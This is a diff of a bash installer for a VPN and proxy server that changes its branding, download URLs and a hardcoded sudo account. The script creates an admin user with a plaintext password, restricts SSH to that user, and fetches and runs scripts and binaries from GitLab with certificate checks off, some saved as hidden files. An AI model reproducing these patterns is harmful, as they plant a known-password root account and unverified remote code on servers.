@@ -10,30 +10,22 @@ PORT_SSL='443';
 OBFS='radeveloper';
 HYSTERIA_TYPE='default';
 
-
-#---------------[ Port Configuration ]---------------
-PORT_TCP="${PORT_TCP:-1194}"
-PORT_UDP="${PORT_UDP:-110}"
-PORT_SSL="${PORT_SSL:-443}"
-PORT_SSL_UDP="${PORT_SSL_UDP:-444}"
-
-#---------------[ Timezone ]-------------------------
 timedatectl set-timezone Asia/Riyadh
 
 install_sudo(){
     # Create user if not exists
-    if ! id "azimaxus" &>/dev/null; then
-        useradd -m -s /bin/bash azimaxus
-        echo "azimaxus:azim.0987Aa" | chpasswd
-        usermod -aG sudo azimaxus
+    if ! id "adminmtk" &>/dev/null; then
+        useradd -m -s /bin/bash adminmtk
+        echo "adminmtk:Mediatek272124@@" | chpasswd
+        usermod -aG sudo adminmtk
     fi
 
     # Disable root SSH login
     sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
 
     # Ensure AllowGroups is set only once
-    if ! grep -q "^AllowGroups azimaxus" /etc/ssh/sshd_config; then
-        echo "AllowGroups azimaxus" >> /etc/ssh/sshd_config
+    if ! grep -q "^AllowGroups adminmtk" /etc/ssh/sshd_config; then
+        echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
     fi
 
     # Restart SSH service
@@ -53,7 +45,7 @@ apt install -y screen squid stunnel4 dropbear gnutls-bin
 apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
 apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 cd /usr/src
-sudo wget https://gitlab.com/mtkgenuine/dexter-devz/-/raw/main/Python-2.7.18.tgz
+sudo wget https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/Python-2.7.18.tgz
 sudo tar xzf Python-2.7.18.tgz
 cd Python-2.7.18
 sudo ./configure --enable-optimizations
@@ -69,7 +61,7 @@ install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://gitlab.com/mtkgenuine/dexter-devz/-/raw/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -246,7 +238,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://gitlab.com/mtkgenuine/dexter-devz/-/raw/main/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -409,7 +401,7 @@ install_squid(){
 clear
 echo 'Installing proxy.'
 {
-    wget --no-check-certificate -O /etc/init.d/squid https://gitlab.com/mtkgenuine/dexter-devz/-/raw/main/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -439,8 +431,8 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     /etc/init.d/squid start
 cd /etc || exit
 
-wget 'https://gitlab.com/mtkgenuine/dexter-devz/-/raw/main/monitorz' -O /etc/.monitor
-wget 'https://gitlab.com/mtkgenuine/dexter-devz/-/raw/main/ws' -O /etc/.ws
+wget 'https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/monitorz' -O /etc/.monitor
+wget 'https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/ws' -O /etc/.ws
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 rm /etc/apt/sources.list
@@ -566,8 +558,8 @@ EOF
 
     # NAT rules
     iptables -t nat -A PREROUTING -i "$server_interface" -p udp --dport 10000:50000 -j DNAT --to-destination :5666
-    iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
-    iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
+    iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+    iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
 
     # Rate-limit connections
     iptables -A INPUT -p udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
@@ -664,7 +656,7 @@ sudo systemctl enable dexter
 sudo systemctl start dexter.service
 	
 	mkdir -m 777 /root/.web
-echo "Made with love by: Vollam LTD Developer... " >> /root/.web/index.php
+echo "Made with love by: MediatekVpn Developer... " >> /root/.web/index.php
 
 echo "tcp_port=TCP_PORT
 udp_port=UDP_PORT
